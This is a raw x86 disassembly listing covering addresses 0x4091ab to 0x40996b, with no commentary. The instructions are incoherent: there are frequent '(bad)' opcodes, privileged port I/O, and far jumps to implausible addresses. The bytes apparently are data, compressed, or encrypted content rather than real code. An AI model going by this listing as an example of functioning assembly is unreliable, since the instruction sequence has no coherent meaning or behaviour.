  4091ab:	sbb    BYTE PTR [esi-0x3a],bh
  4091ae:	cli    
  4091af:	enter  0xdbd3,0x5c
  4091b3:	(bad)  
  4091b4:	mov    edx,0xdde806ae
  4091b9:	push   cs
  4091ba:	xchg   edx,eax
  4091bb:	dec    ebp
  4091bc:	int3   
  4091bd:	and    DWORD PTR [edx-0x57c285ac],esi
  4091c3:	push   ecx
  4091c4:	push   cs
  4091c5:	retf   0xed5d
  4091c8:	sbb    DWORD PTR [ebp+0x43e1f4fa],edi
  4091ce:	ret    0x2c7
  4091d1:	ja     0x409224
  4091d3:	jo     0x4091c3
  4091d5:	sbb    ebx,esp
  4091d7:	stc    
  4091d8:	mov    al,ds:0x2d416fa4
  4091dd:	pusha  
  4091de:	pop    esi
  4091df:	add    al,0xd4
  4091e1:	out    0xcc,al
  4091e3:	mov    DWORD PTR ss:[edi-0x2d],edx
  4091e7:	enter  0x2bf1,0x90
  4091eb:	push   ss
  4091ec:	js     0x409251
  4091ee:	jl     0x4091b7
  4091f0:	jnp    0x40917a
  4091f2:	jns    0x40918d
  4091f4:	jp     0x409245
  4091f6:	rcl    DWORD PTR [esi-0x21],1
  4091f9:	sbb    al,BYTE PTR [esi+edi*4+0x13]
  4091fd:	jno    0x40922f
  4091ff:	push   es
  409200:	(bad)  
  409201:	idiv   DWORD PTR [ebx]
  409203:	stos   BYTE PTR es:[edi],al
  409204:	test   eax,0x107940b8
  409209:	mov    ch,0x6d
  40920b:	ror    DWORD PTR [esp+ecx*2-0x66c14ad9],cl
  409212:	dec    esp
  409213:	inc    ebp
  409214:	xlat   BYTE PTR ds:[ebx]
  409215:	jmp    0x61a3:0xef5e0810
  40921c:	outs   dx,BYTE PTR ds:[esi]
  40921d:	retf   
  40921e:	out    dx,eax
  40921f:	in     al,dx
  409220:	mov    edi,ebp
  409222:	fidiv  DWORD PTR [edi-0x25]
  409225:	imul   DWORD PTR [ebp-0x111cc82f]
  40922b:	ret    0x35dc
  40922e:	cld    
  40922f:	aad    0x68
  409231:	and    BYTE PTR [eax-0x3eb80ec],cl
  409237:	adc    DWORD PTR [ebx-0x1e],0xb61b5b11
  40923e:	jmp    0x4092a9
  409240:	xchg   BYTE PTR [ebx],bh
  409242:	sti    
  409243:	sub    eax,DWORD PTR [eax+0x70a69653]
  409249:	mov    eax,ds:0x397887b8
  40924e:	sub    al,ch
  409250:	pushf  
  409251:	push   cs
  409252:	ins    BYTE PTR es:[edi],dx
  409253:	movsx  eax,BYTE PTR [edx+ecx*1]
  409257:	xchg   edi,eax
  409258:	lods   eax,DWORD PTR ds:[esi]
  409259:	jns    0x409254
  40925b:	inc    edi
  40925c:	std    
  40925d:	iret   
  40925e:	push   ecx
  40925f:	pop    ebp
  409260:	retf   
  409261:	xchg   esp,eax
  409262:	popa   
  409263:	adc    cl,0x2f
  409266:	aad    0xb9
  409268:	mov    esp,0xb96ec99a
  40926d:	cmp    esp,DWORD PTR [ebx+0x4e]
  409270:	out    dx,eax
  409271:	sub    bh,dl
  409273:	stos   BYTE PTR es:[edi],al
  409274:	je     0x4092eb
  409276:	(bad)  
  409277:	out    dx,al
  409278:	add    eax,0x8d5b397d
  40927d:	cmp    bl,BYTE PTR [eax]
  40927f:	sub    edi,DWORD PTR [edx]
  409281:	ins    DWORD PTR es:[edi],dx
  409282:	xor    edi,DWORD PTR ds:0x51c8be67
  409288:	cmp    al,0x8b
  40928a:	dec    ecx
  40928b:	aam    0xa2
  40928d:	test   al,0xf0
  40928f:	call   0x3a064553
  409294:	mov    ah,0x1e
  409296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409297:	adc    DWORD PTR [edi],ecx
  409299:	fst    DWORD PTR [esi]
  40929b:	sbb    bh,dh
  40929d:	shl    BYTE PTR [esi+0xe9ee8e5],cl
  4092a3:	cmp    DWORD PTR [ecx+0x38e91108],ecx
  4092a9:	push   ebx
  4092aa:	stos   DWORD PTR es:[edi],eax
  4092ab:	dec    esp
  4092ac:	repnz xlat BYTE PTR ds:[ebx]
  4092ae:	loopne 0x40925c
  4092b0:	or     eax,0x1c28585b
  4092b5:	mov    BYTE PTR [ebp+0xacfc74b],0x50
  4092bc:	mov    WORD PTR [ebp+0xf24d57a],cs
  4092c2:	dec    edi
  4092c3:	cwde   
  4092c4:	sub    al,0x84
  4092c6:	and    BYTE PTR [esi+0x3ef79b30],ah
  4092cc:	rcl    BYTE PTR [ecx-0xa97667d],0x1b
  4092d3:	dec    esp
  4092d4:	popa   
  4092d5:	pop    es
  4092d6:	adc    dh,BYTE PTR [edx]
  4092d8:	ja     0x4092c4
  4092da:	push   eax
  4092db:	jae    0x40933c
  4092dd:	jbe    0x4092a6
  4092df:	loop   0x40935f
  4092e1:	pusha  
  4092e2:	cmp    DWORD PTR [esi-0x64fea690],ebp
  4092e8:	jmp    0xc340a43f
  4092ed:	sbb    DWORD PTR [ebp+0xdbf6f9c],eax
  4092f3:	sbb    al,0x5b
  4092f5:	and    al,0x54
  4092f7:	push   eax
  4092f8:	fidiv  DWORD PTR ds:0xd1b3a7bc
  4092fe:	pop    esp
  4092ff:	mov    eax,0x6c3566d7
  409304:	fstp   QWORD PTR [ebx]
  409306:	cmp    BYTE PTR [ecx],ch
  409308:	cmp    BYTE PTR [esi+0x1c],ah
  40930b:	push   0xffffffad
  40930d:	and    bh,cl
  40930f:	mov    eax,0x7d543580
  409314:	xchg   ebx,eax
  409315:	inc    edx
  409316:	and    dh,dl
  409318:	fcmovb st,st(2)
  40931a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40931b:	xchg   ecx,eax
  40931c:	push   edi
  40931d:	into   
  40931e:	xchg   ebp,eax
  40931f:	push   es
  409320:	mov    edx,0x7c55af2a
  409325:	mov    dl,0xa1
  409327:	add    al,0xf7
  409329:	adc    DWORD PTR [ecx],0xecc95411
  40932f:	mov    edi,0xa0ece0b
  409334:	jnp    0x40934e
  409336:	cmp    bl,BYTE PTR [ebx]
  409338:	hlt    
  409339:	and    al,0x99
  40933b:	adc    eax,0xe7fa2a4b
  409340:	pop    ebp
  409341:	mov    dl,0xc2
  409343:	push   ds
  409344:	lock out dx,eax
  409346:	gs std 
  409348:	popf   
  409349:	mov    ebp,0x9438a887
  40934e:	aas    
  40934f:	jle    0x409306
  409351:	sub    BYTE PTR [esi-0x72],dl
  409354:	sbb    DWORD PTR [edx],ebp
  409356:	adc    ebx,DWORD PTR [edx+0xb84cfb8]
  40935c:	ins    BYTE PTR es:[edi],dx
  40935d:	fild   DWORD PTR ds:0xd126b555
  409363:	cmp    BYTE PTR [ebx],0xf
  409366:	ins    BYTE PTR es:[edi],dx
  409367:	aad    0x2c
  409369:	mov    ecx,0x5141a866
  40936e:	mov    bh,0xf4
  409370:	inc    edx
  409371:	mov    ebx,0x567f387d
  409376:	pop    eax
  409377:	dec    ebx
  409378:	retf   0x9b2b
  40937b:	es inc ebp
  40937d:	pop    ebp
  40937e:	(bad)  
  40937f:	pop    ss
  409380:	push   edx
  409381:	xor    BYTE PTR [ecx+0x66],al
  409384:	or     eax,ebp
  409386:	sub    esp,ebp
  409388:	push   ecx
  409389:	das    
  40938a:	out    0x7e,eax
  40938c:	test   ch,0x69
  40938f:	clc    
  409390:	outs   dx,BYTE PTR ds:[esi]
  409391:	fld    QWORD PTR [esi+0x61389f48]
  409397:	das    
  409398:	jmp    0x409394
  40939a:	mov    ch,0xbb
  40939c:	shl    BYTE PTR ds:0xa6016c9c,cl
  4093a2:	lds    ebx,FWORD PTR [ebx-0x4e7c5ee7]
  4093a8:	or     al,0xa7
  4093aa:	scas   al,BYTE PTR es:[edi]
  4093ab:	mov    ds:0xde031268,eax
  4093b0:	addr16 loopne 0x4093d4
  4093b3:	das    
  4093b4:	cmp    dl,BYTE PTR ds:0xcc7fdb8e
  4093ba:	or     eax,0x7d14130e
  4093bf:	ret    0x64a9
  4093c2:	jecxz  0x409426
  4093c4:	inc    eax
  4093c5:	cmp    BYTE PTR es:[eax+0x16],al
  4093c9:	rol    ebx,1
  4093cb:	push   ecx
  4093cc:	scas   al,BYTE PTR es:[edi]
  4093cd:	cmp    DWORD PTR [eax+0x6bf0e060],esp
  4093d3:	in     eax,0xe5
  4093d5:	outs   dx,DWORD PTR ds:[esi]
  4093d6:	mov    eax,0xe1206b87
  4093db:	sub    BYTE PTR [ebp-0x1047c10c],bl
  4093e1:	scas   al,BYTE PTR es:[edi]
  4093e2:	fld    TBYTE PTR [ebp-0x46]
  4093e5:	loopne 0x4093c2
  4093e7:	rcl    BYTE PTR [ebx],1
  4093e9:	stos   DWORD PTR es:[edi],eax
  4093ea:	xchg   DWORD PTR [ecx+0x1c],edx
  4093ed:	mov    edi,0x4be26891
  4093f2:	(bad)  
  4093f3:	mov    cl,0x59
  4093f5:	pop    esi
  4093f6:	inc    edx
  4093f7:	mov    ecx,0x6c21894d
  4093fc:	mov    al,ds:0xe1480f99
  409401:	ins    BYTE PTR es:[edi],dx
  409402:	lds    edi,FWORD PTR [edi]
  409404:	dec    ebp
  409405:	adc    BYTE PTR [edx],al
  409407:	xchg   BYTE PTR [edx],al
  409409:	jge    0x4093e6
  40940b:	jne    0x4093bf
  40940d:	jmp    0xba29bd4d
  409412:	xchg   BYTE PTR [edi],bl
  409414:	and    ebp,esi
  409416:	(bad)  [edi]
  409418:	lock (bad) [esi-0x6bc6f46d]
  40941f:	xchg   esi,eax
  409420:	lods   eax,DWORD PTR ds:[esi]
  409421:	xchg   esi,eax
  409422:	ja     0x4093e4
  409424:	cmp    eax,DWORD PTR [ebp+0x17]
  409427:	xlat   BYTE PTR ds:[ebx]
  409428:	pop    ds
  409429:	or     eax,0xab01f657
  40942e:	fwait
  40942f:	cs pop ss
  409431:	sbb    eax,edx
  409433:	mov    dl,0xa3
  409435:	xlat   BYTE PTR ds:[ebx]
  409436:	dec    ebp
  409437:	add    al,BYTE PTR [edi-0x12eb36a7]
  40943d:	sbb    ch,BYTE PTR [edi+0x17eed6f1]
  409443:	xchg   edi,eax
  409444:	imul   edx,DWORD PTR [edx-0x4b],0xffffffb0
  409448:	jg     0x409473
  40944a:	cld    
  40944b:	lea    esi,[esi+0x0]
  40944e:	or     edi,DWORD PTR [esi-0x4]
  409451:	cwde   
  409452:	and    edx,DWORD PTR [edi-0x406a9df8]
  409458:	sub    dl,BYTE PTR [esi-0x21]
  40945b:	inc    ebx
  40945c:	repnz mov dl,0xfe
  40945f:	bound  esp,QWORD PTR [esi-0x2b]
  409462:	cmp    ah,BYTE PTR [ebx+0x6b]
  409465:	inc    ebx
  409466:	push   edi
  409467:	mov    bl,bh
  409469:	test   BYTE PTR [ecx+eiz*8+0x1f],al
  40946d:	aad    0x9f
  40946f:	aam    0xb7
  409471:	mov    esp,0x2359a01c
  409476:	fistp  WORD PTR [esp+ebx*2+0x506bfaf9]
  40947d:	jg     0x409424
  40947f:	jmp    0x4094b2
  409481:	iret   
  409482:	frndint 
  409484:	lea    esp,[ebp+0x17]
  409487:	dec    ebp
  409488:	cs xchg ebx,eax
  40948a:	dec    ecx
  40948b:	ins    BYTE PTR es:[edi],dx
  40948c:	xchg   ebx,eax
  40948d:	cwde   
  40948e:	inc    edi
  40948f:	cmp    eax,DWORD PTR [ecx+eiz*2]
  409492:	pop    ss
  409493:	shl    esi,1
  409495:	push   ebp
  409496:	sbb    eax,0x4d0a37f9
  40949b:	and    eax,esp
  40949d:	ss inc edi
  40949f:	cdq    
  4094a0:	jecxz  0x409444
  4094a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094a3:	jecxz  0x40942b
  4094a5:	or     al,0x23
  4094a7:	jae    0x409501
  4094a9:	jg     0x40943c
  4094ab:	cmp    al,ah
  4094ad:	pop    es
  4094ae:	(bad)  
  4094af:	hlt    
  4094b0:	add    eax,0x30f28e20
  4094b5:	cld    
  4094b6:	retf   
  4094b7:	push   ebx
  4094b8:	popa   
  4094b9:	bound  esi,QWORD PTR [esi+esi*4]
  4094bc:	sbb    DWORD PTR [ebx+esi*4+0x50fd2fd],eax
  4094c3:	pop    ebx
  4094c4:	push   ebp
  4094c5:	mov    esp,0x2dffba75
  4094ca:	cmp    DWORD PTR [edx-0x78c91945],esi
  4094d0:	ss dec ebp
  4094d2:	cli    
  4094d3:	daa    
  4094d4:	jo     0x40951d
  4094d6:	xchg   edx,eax
  4094d7:	ins    DWORD PTR es:[edi],dx
  4094d8:	mov    ebx,0xc4cb3d0b
  4094dd:	sbb    BYTE PTR [esi+edi*2],0xbd
  4094e1:	push   ss
  4094e2:	iret   
  4094e3:	push   cs
  4094e4:	icebp  
  4094e5:	pop    esi
  4094e6:	xor    eax,0x8201138e
  4094eb:	in     al,0xca
  4094ed:	sub    BYTE PTR [ecx+eiz*4+0x18cc71e0],bl
  4094f4:	aad    0x68
  4094f6:	sub    al,0x62
  4094f8:	xor    BYTE PTR [eax+edi*4],dh
  4094fb:	cdq    
  4094fc:	fild   WORD PTR [eax]
  4094fe:	ds push edx
  409500:	lods   al,BYTE PTR ds:[esi]
  409501:	or     al,0x88
  409503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409504:	call   0x1af0434a
  409509:	push   0xb52bdbec
  40950e:	repnz sbb DWORD PTR [eax],esp
  409511:	push   ecx
  409512:	xchg   edi,eax
  409513:	cmp    al,0x2
  409515:	cld    
  409516:	repz sar ebp,0x11
  40951a:	icebp  
  40951b:	fadd   DWORD PTR [edi]
  40951d:	dec    ebp
  40951e:	cmp    cl,BYTE PTR [eax]
  409520:	inc    ebx
  409521:	stos   DWORD PTR es:[edi],eax
  409522:	mov    edi,0x9f6c94d
  409527:	pop    ebp
  409528:	dec    esp
  409529:	sub    al,0xe6
  40952b:	xrelease xchg DWORD PTR [ecx],esi
  40952e:	push   esp
  40952f:	mov    cl,0xe2
  409531:	imul   ecx,ecx,0x17
  409534:	test   ch,cl
  409536:	dec    edx
  409537:	adc    eax,0xeadc06a6
  40953c:	int3   
  40953d:	sbb    ebx,DWORD PTR [esi]
  40953f:	mov    bh,0xfb
  409541:	adc    bl,BYTE PTR [edx+0x14]
  409544:	jmp    0x28ff0191
  409549:	in     eax,0xdd
  40954b:	sub    esi,DWORD PTR [esi+ebx*1]
  40954e:	in     al,dx
  40954f:	(bad)  
  409551:	cli    
  409552:	dec    eax
  409553:	mov    dh,0x9
  409555:	std    
  409556:	jmp    0x4095ce
  409558:	dec    ecx
  409559:	shr    DWORD PTR [ecx],1
  40955b:	scas   al,BYTE PTR es:[edi]
  40955c:	jmp    FWORD PTR [ebx+0x53]
  40955f:	sbb    eax,0x887b3d90
  409564:	inc    ebp
  409565:	mov    ah,0x23
  409567:	mov    ds:0x67aa979e,al
  40956c:	out    0x2a,eax
  40956e:	mov    al,0xb6
  409570:	jge    0x409555
  409572:	in     eax,dx
  409573:	(bad)  
  409574:	(bad)  [ebp+eax*2+0x31eeb767]
  40957b:	push   cs
  40957c:	ja     0x409503
  40957e:	inc    edi
  40957f:	mov    edx,0x5df47bba
  409584:	jno    0x4095fa
  409586:	loope  0x40954d
  409588:	imul   BYTE PTR [si]
  40958b:	mov    dl,0x38
  40958d:	retf   0x7304
  409590:	inc    ebx
  409591:	pop    ss
  409592:	add    dh,bh
  409594:	xor    DWORD PTR [eax+0x30],edx
  409597:	iret   
  409598:	mov    bh,0xd3
  40959a:	xor    BYTE PTR [eax+ebp*8+0x7353b790],bl
  4095a1:	int    0x95
  4095a3:	adc    edx,DWORD PTR [ebp+0xf989adf]
  4095a9:	push   esi
  4095aa:	mov    al,BYTE PTR [ebx]
  4095ac:	loopne 0x4095dd
  4095ae:	mov    dl,0x3f
  4095b0:	mov    al,0x88
  4095b2:	scas   al,BYTE PTR es:[edi]
  4095b3:	inc    ebx
  4095b4:	or     ch,bl
  4095b6:	mov    ecx,0xa7f656c7
  4095bb:	rol    DWORD PTR [ecx-0x7b],0xe8
  4095bf:	cmp    esp,DWORD PTR [ecx+0xb]
  4095c2:	lahf   
  4095c3:	mov    WORD PTR [edi-0x54],?
  4095c6:	mov    fs,WORD PTR [eax+0x352991ae]
  4095cc:	out    0x66,al
  4095ce:	(bad)  
  4095cf:	fdiv   DWORD PTR [ecx]
  4095d1:	dec    edx
  4095d2:	mov    bh,0x86
  4095d4:	imul   esi,DWORD PTR [esp+eax*8+0x69],0xe1d33cd3
  4095dc:	xor    eax,DWORD PTR [eax+0x2c30e4dd]
  4095e2:	sub    eax,0xf908dc5e
  4095e7:	fbld   TBYTE PTR [ebx+0x2c67cec5]
  4095ed:	cmp    DWORD PTR [esi-0x782c0ea8],0xfffffff4
  4095f4:	mov    esp,cs
  4095f6:	mov    cl,0xe9
  4095f8:	sbb    DWORD PTR [eax+ebp*2+0x35],ebp
  4095fc:	push   ds
  4095fd:	test   eax,0x6e6ffc7a
  409602:	ins    DWORD PTR es:[edi],dx
  409603:	shl    BYTE PTR [ebx],cl
  409605:	add    eax,0x914145bd
  40960a:	pop    edi
  40960b:	ss sbb esi,ebx
  40960e:	push   0xffffff98
  409610:	jno    0x4095a4
  409612:	lock jl 0x409654
  409615:	lds    edi,FWORD PTR [ecx+0x63530fa0]
  40961b:	std    
  40961c:	fisttp DWORD PTR [edx-0x6a]
  40961f:	shl    dl,cl
  409621:	jne    0x40969c
  409623:	pop    edx
  409624:	cmp    ah,BYTE PTR [edx]
  409626:	gs mov dh,0xbc
  409629:	cmc    
  40962a:	sar    esi,0xea
  40962d:	lea    edx,[edi+0x51]
  409630:	adc    al,0x8d
  409632:	xchg   esi,eax
  409633:	rol    BYTE PTR [esi-0x2a],1
  409636:	popa   
  409637:	xchg   ebp,eax
  409638:	ror    BYTE PTR [esi+eax*4+0x28],0x55
  40963d:	add    edi,DWORD PTR [esi+0x14]
  409640:	add    esi,DWORD PTR [ebp-0x14]
  409643:	mov    al,0x38
  409645:	rep outs dx,DWORD PTR ds:[esi]
  409647:	xchg   ebx,eax
  409648:	into   
  409649:	push   di
  40964b:	movq   mm7,QWORD PTR [ecx-0x40dff542]
  409652:	and    ch,BYTE PTR [ebx-0x4068ecca]
  409658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409659:	hlt    
  40965a:	push   cs
  40965b:	mov    ah,0x9b
  40965d:	xor    eax,0x1e2404fc
  409662:	xchg   ebx,eax
  409663:	mov    bl,0x21
  409665:	std    
  409666:	or     eax,0xe4a59e5d
  40966b:	pop    ebp
  40966c:	je     0x40964d
  40966e:	int    0x83
  409670:	aas    
  409671:	cmc    
  409672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409673:	mov    DWORD PTR [edx],0xc24059e9
  409679:	sbb    edx,edx
  40967b:	mov    DWORD PTR [esi],ebx
  40967d:	lahf   
  40967e:	xchg   esp,eax
  40967f:	scas   eax,DWORD PTR es:[edi]
  409680:	or     al,BYTE PTR [ecx-0x55b6566a]
  409686:	(bad)  
  409687:	jmp    0x409691
  409689:	adc    ch,BYTE PTR [ebx-0x9c89c7f]
  40968f:	js     0x409629
  409691:	and    al,0x22
  409693:	or     eax,0x54164fa
  409698:	sbb    dl,ah
  40969a:	adc    DWORD PTR [ecx-0x4e],eax
  40969d:	inc    edi
  40969e:	mov    ebp,0xe7862780
  4096a3:	daa    
  4096a4:	stos   BYTE PTR es:[edi],al
  4096a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096a6:	cmp    eax,ebx
  4096a8:	mov    al,0x9f
  4096aa:	stos   BYTE PTR es:[edi],al
  4096ab:	or     edi,DWORD PTR [esp+ebp*2+0x27]
  4096af:	shl    DWORD PTR [bx+di+0x59],0xc9
  4096b4:	sbb    esp,DWORD PTR [eax+0x20106797]
  4096ba:	dec    esp
  4096bb:	ror    DWORD PTR ds:0x8131e4dd,1
  4096c1:	data16 ins BYTE PTR es:[di],dx
  4096c4:	push   cs
  4096c5:	hlt    
  4096c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096c7:	jo     0x4096e5
  4096c9:	jge    0x40970a
  4096cb:	or     ah,dh
  4096cd:	in     eax,0x15
  4096cf:	out    0xbf,al
  4096d1:	(bad)  
  4096d3:	aaa    
  4096d4:	in     eax,dx
  4096d5:	mov    al,0xd8
  4096d7:	mov    al,ds:0x8eb996ee
  4096dc:	sbb    ah,BYTE PTR [eax-0x38ab786d]
  4096e2:	mov    edi,0xc59287ff
  4096e7:	mov    ds:0x3d1b200f,eax
  4096ec:	pop    eax
  4096ed:	xchg   ebx,eax
  4096ee:	cwde   
  4096ef:	icebp  
  4096f0:	inc    esp
  4096f1:	xchg   BYTE PTR [eax+0x6f4e2d85],bh
  4096f7:	mov    dl,0xca
  4096f9:	sbb    ebx,DWORD PTR [edx]
  4096fb:	stos   DWORD PTR es:[edi],eax
  4096fc:	add    eax,0x816ae3bc
  409701:	fwait
  409702:	xchg   edx,eax
  409703:	mov    ebx,0x5ff10ce0
  409708:	adc    eax,0xc9f5b5b1
  40970d:	adc    eax,DWORD PTR [ecx]
  40970f:	nop
  409710:	sub    DWORD PTR [edi-0xb9d5752],ecx
  409716:	push   cs
  409717:	mov    WORD PTR [edi-0x5a628391],?
  40971d:	dec    edi
  40971e:	jne    0x40979c
  409720:	inc    esp
  409722:	or     ebp,DWORD PTR [esi]
  409724:	out    0x6a,eax
  409726:	mov    ebp,0x4d7aecb
  40972b:	js     0x4096f8
  40972d:	adc    al,0x8a
  40972f:	pop    ss
  409730:	mov    cs,WORD PTR [ebp-0xa344a39]
  409736:	dec    eax
  409737:	repnz add esp,DWORD PTR cs:[ebx+0x67eafb6e]
  40973f:	lds    esi,FWORD PTR [ecx-0x6b417af2]
  409745:	mov    edx,0x747453a9
  40974a:	(bad)  
  40974c:	add    DWORD PTR [edx],esp
  40974e:	leave  
  40974f:	cmc    
  409750:	jl     0x4096e0
  409752:	stos   BYTE PTR es:[edi],al
  409753:	mov    ebp,0xf0a682d2
  409758:	scas   eax,DWORD PTR es:[edi]
  409759:	cs out 0x4b,eax
  40975c:	or     al,0x73
  40975e:	daa    
  40975f:	ins    BYTE PTR es:[edi],dx
  409760:	fisubr DWORD PTR [esi]
  409762:	repnz imul ebp,DWORD PTR [edx+0x6e2fb228],0x8d0d6fe9
  40976d:	(bad)  
  40976f:	(bad)  
  409770:	mov    esi,0xc56d938d
  409775:	out    0xb8,eax
  409777:	cmc    
  409778:	push   edx
  409779:	popf   
  40977a:	addr16 jmp 0xeac8ca67
  409780:	bound  ebx,QWORD PTR [edx+0x77b391d3]
  409786:	test   ah,0x13
  409789:	jo     0x4097e7
  40978b:	push   esp
  40978c:	adc    BYTE PTR [esp+edx*4-0x46e59e7c],dh
  409793:	lods   al,BYTE PTR ds:[esi]
  409794:	ss xchg ecx,eax
  409796:	es pop eax
  409798:	rol    BYTE PTR [ebx-0x1e76f3d8],0xc6
  40979f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097a0:	cld    
  4097a1:	aam    0xb
  4097a3:	inc    esi
  4097a4:	sbb    dh,BYTE PTR [esp+esi*2+0x3a]
  4097a8:	je     0x409750
  4097aa:	xchg   edx,eax
  4097ab:	xor    DWORD PTR [edx-0x43a2424b],esp
  4097b1:	shl    DWORD PTR [edi],0xa7
  4097b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097b5:	repnz cmp BYTE PTR ds:0xe5f55e0d,ch
  4097bc:	in     al,0xc4
  4097be:	inc    ebx
  4097bf:	in     eax,0xd3
  4097c1:	or     BYTE PTR [ebp+ebx*4-0x7f],dl
  4097c5:	(bad)  
  4097c6:	mov    edx,0x4379d931
  4097cb:	sti    
  4097cc:	int3   
  4097cd:	push   ds
  4097ce:	idiv   ebx
  4097d0:	ins    DWORD PTR es:[edi],dx
  4097d1:	adc    BYTE PTR [ecx*1+0x19a0136e],0x8b
  4097d9:	dec    ebp
  4097da:	xor    ecx,eax
  4097dc:	out    0x40,al
  4097de:	retf   
  4097df:	std    
  4097e0:	ins    DWORD PTR es:[edi],dx
  4097e1:	fldcw  WORD PTR [ecx-0x33e0f125]
  4097e7:	js     0x409854
  4097e9:	leave  
  4097ea:	push   es
  4097eb:	or     esi,DWORD PTR [eax]
  4097ed:	add    dh,BYTE PTR [edi+0x45]
  4097f0:	cmp    DWORD PTR [eax],eax
  4097f2:	xchg   esp,eax
  4097f3:	outs   dx,DWORD PTR ds:[esi]
  4097f4:	aas    
  4097f5:	mov    ecx,DWORD PTR [edx-0x44]
  4097f8:	pusha  
  4097f9:	fs out 0xe0,eax
  4097fc:	icebp  
  4097fd:	push   ss
  4097fe:	push   0xec15e8c2
  409803:	mov    ebx,0x4e5f2aed
  409808:	(bad)  [eax-0x52]
  40980b:	xor    DWORD PTR [esi-0x30332ea1],edi
  409811:	xor    DWORD PTR [esi+0x3bc78055],esp
  409817:	mov    ecx,0x78660641
  40981c:	lods   eax,DWORD PTR ds:[esi]
  40981d:	mov    WORD PTR [edi+0x5e959015],fs
  409823:	mov    eax,0x41a2670a
  409828:	data16 data16 cld 
  40982b:	stos   DWORD PTR es:[edi],eax
  40982c:	push   ebp
  40982d:	and    DWORD PTR [edx+0x7cc2bac2],ebx
  409833:	fwait
  409834:	xchg   edi,eax
  409835:	pop    esp
  409836:	ret    
  409837:	and    al,al
  409839:	push   0x56ffa026
  40983e:	xchg   BYTE PTR [edx-0x30c24d1e],dh
  409844:	iret   
  409845:	repnz cs in eax,dx
  409848:	xlat   BYTE PTR ds:[ebx]
  409849:	inc    eax
  40984a:	add    ch,BYTE PTR [eax]
  40984c:	in     al,0x7e
  40984e:	sub    dl,cl
  409850:	pop    ebp
  409851:	outs   dx,DWORD PTR ds:[esi]
  409852:	or     dh,BYTE PTR [ecx]
  409854:	xor    DWORD PTR [eax-0x79e7ed48],esi
  40985a:	aad    0x10
  40985c:	xchg   ebp,edx
  40985e:	(bad)  [eax+0x7]
  409861:	enter  0xd49f,0xec
  409865:	int    0xf8
  409867:	pusha  
  409868:	jne    0x40988b
  40986a:	dec    ecx
  40986b:	dec    ebx
  40986c:	inc    eax
  40986d:	jne    0x409859
  40986f:	mov    ch,0xb2
  409871:	pop    ecx
  409872:	pop    ecx
  409873:	add    ecx,0x70
  409876:	mov    bh,0xa4
  409878:	mov    edx,0x5efe1f5d
  40987d:	int3   
  40987e:	inc    edi
  40987f:	mov    al,ds:0xd66cdc79
  409884:	cmp    eax,DWORD PTR [esi]
  409886:	cmc    
  409887:	xchg   ebp,eax
  409888:	fidivr WORD PTR [ebx-0x46bacf9a]
  40988e:	cmp    al,0xb1
  409891:	jno    0x40988b
  409893:	test   BYTE PTR [eax+0x4],dh
  409896:	loop   0x409899
  409898:	add    al,0x8c
  40989a:	mov    esp,0x1ad137e0
  40989f:	stos   BYTE PTR es:[edi],al
  4098a0:	out    dx,al
  4098a1:	adc    BYTE PTR [eax+esi*2+0x3cfbd88a],bh
  4098a8:	ret    0x9212
  4098ab:	xor    cl,cl
  4098ad:	sbb    DWORD PTR [ebx],ebx
  4098af:	sub    eax,0x36990e9d
  4098b4:	add    edx,DWORD PTR [edx-0x1c5af72d]
  4098ba:	mov    bh,0x1f
  4098bc:	mov    eax,0x3fa95568
  4098c1:	sti    
  4098c2:	xor    DWORD PTR ds:0xb8aa4e9c,0xffffff97
  4098c9:	cs lock xchg edi,eax
  4098cc:	xchg   BYTE PTR [edx],ch
  4098ce:	fs mov dl,0xed
  4098d1:	mov    cl,0x88
  4098d3:	mov    bl,0x45
  4098d5:	add    eax,esi
  4098d7:	xacquire xchg DWORD PTR [ebp+0x34221ed7],ebx
  4098de:	push   ss
  4098df:	mov    cl,0xbb
  4098e1:	dec    DWORD PTR [edx]
  4098e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098e4:	or     BYTE PTR [edi-0x762caf76],ch
  4098ea:	data16 jns 0x40993a
  4098ed:	push   es
  4098ee:	and    cl,BYTE PTR [eax-0x6f927064]
  4098f4:	scas   eax,DWORD PTR es:[edi]
  4098f5:	cwde   
  4098f6:	out    0x86,eax
  4098f8:	xchg   esi,eax
  4098f9:	and    DWORD PTR [esi+0xf],edx
  4098fc:	ins    BYTE PTR es:[edi],dx
  4098fd:	xchg   ebx,eax
  4098fe:	mov    ds:0xa877125f,al
  409903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409904:	fsubr  QWORD PTR [edi+ebx*4]
  409907:	(bad)  
  409909:	pop    ss
  40990a:	jmp    0x5814ab74
  40990f:	clc    
  409910:	cmp    bl,dh
  409912:	inc    esi
  409913:	add    al,0xa5
  409915:	dec    BYTE PTR [edi-0x3b]
  409918:	int3   
  409919:	test   DWORD PTR [edi],esp
  40991b:	popf   
  40991c:	(bad)  
  40991d:	adc    al,0x9f
  40991f:	mov    dl,0x32
  409921:	dec    eax
  409922:	pop    edi
  409923:	cmp    eax,0xa26bee68
  409928:	retf   
  409929:	jb     0x4098b6
  40992b:	mov    ebx,0x6e67a0ba
  409930:	mov    DWORD PTR [edi-0x59e070a2],ebx
  409936:	mov    al,ds:0x92ec44e3
  40993b:	invd   
  40993d:	adc    bl,BYTE PTR [edx-0x6a]
  409940:	xor    DWORD PTR ds:0xbc08191c,esi
  409946:	push   0x62
  409948:	mov    bl,dl
  40994a:	js     0x4098e8
  40994c:	mov    ds:0xf0dd3571,eax
  409951:	sub    BYTE PTR [ecx],bl
  409953:	je     0x40994d
  409955:	jb     0x4098fe
  409957:	ret    0xe5ab
  40995a:	in     al,0xa2
  40995c:	cmp    dh,BYTE PTR [edi+0x76]
  40995f:	inc    esi
  409960:	fld    QWORD PTR [edx+0x1095fb1e]
  409966:	not    dl
  409968:	sbb    ecx,DWORD PTR [edi+0x45]
  40996b:	pop    ebx
